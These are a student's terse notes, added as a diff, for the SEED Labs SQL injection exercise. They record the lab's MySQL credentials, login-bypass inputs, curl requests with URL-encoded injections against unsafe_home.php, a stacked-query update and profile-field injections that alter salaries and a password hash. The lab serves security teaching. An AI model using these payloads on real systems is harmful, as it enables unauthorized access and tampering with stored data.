@@ -1,0 +1,55 @@
+3.........
+mysql -u root -pseedubuntu
+
+USE Users;
+SHOW TABLES;
+DESCRIBE credential;
+SELECT * FROM credential WHERE name = 'Alice';
+3.1..........
+2.1..
+admin' #
+boby' #
+
+
+checkfile..
+cd /var/www/SQLInjection/
+ls
+
+anything
+2.2..
+valid..
+curl 'http://www.SEEDLabSQLInjection.com/unsafe_home.php?username=alice&Password=seedalice'
+
+invalid.
+curl 'http://www.SEEDLabSQLInjection.com/unsafe_home.php?username=alice&Password=seed'
+
+valid commandline:
+curl 'http://www.SEEDLabSQLInjection.com/unsafe_home.php?username=admin%27%20%23&Password=abc'
+
+%27-'
+%20-space
+%23-#
+
+2.3 ...
+unsafe.php
+not possible .because conn->query takes one single query
+if you want to run the make first conn->query to conn->multi_query($sql)) 
+
+solution...
+alice'; UPDATE credential SET nickname='hacked_alice' WHERE name='alice'; #
+
+terminal:
+curl 'http://www.SEEDLabSQLInjection.com/unsafe_home.php?username=alice%27%3B%20UPDATE%20credential%20SET%20nickname%3D%27hacked_alice%27%20WHERE%20name%3D%27alice%27%3B%20%23&Password=abc'
+
+
+3..
+
+log in then edit profile.
+in name section
+1.first    ', salary='999999 
+2.2nd      ', salary='1' where Name="boby" #
+3.3rd       ',password=sha1('hacked') where Name="boby"; #
+
+
+
+3.4 ..rewrite with param
